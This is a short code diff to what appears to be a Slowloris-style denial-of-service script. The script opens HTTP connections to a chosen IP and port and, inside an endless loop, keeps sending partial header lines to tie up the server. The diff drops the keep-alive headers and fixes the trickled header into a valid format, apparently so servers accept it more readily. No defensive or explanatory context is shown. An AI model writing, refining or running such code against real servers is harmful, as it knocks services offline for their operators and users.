@@ -34,8 +34,6 @@ request = [
     f"Host: {args.ip}:{args.port}",
     "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
     "Accept-language: en-US,en,q=0.5",
-    "Connection: keep-alive",
-    "Keep-Alive: timeout=100, max=1000",
 ]
 request = "\r\n".join(request)
 
@@ -72,7 +70,7 @@ def main():
     count = 1
     while True:
         try:
-            s.sendall(b"X-a 10000\r\n")
+            s.sendall(b"X-a: 10000\r\n")
         except socket.error:
             print("ERROR: something went wrong with sending request, exiting")
             break
